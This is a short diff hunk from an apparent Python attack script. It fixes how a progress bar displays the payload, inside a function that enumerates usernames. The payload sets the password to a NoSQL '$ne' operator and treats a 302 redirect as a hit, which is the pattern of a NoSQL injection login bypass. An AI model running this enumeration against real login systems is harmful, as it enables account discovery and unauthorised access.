@@ -71,8 +71,8 @@ def enumerate_usernames(session, url):
                 'password': {'$ne': None}
             }
             
-            progress_bar.status(payload[-200:])
-            
+            progress_bar.status(str(payload)[-200:])
+             
             response = make_request(session, url, payload)
             
             if response.status_code == 302:
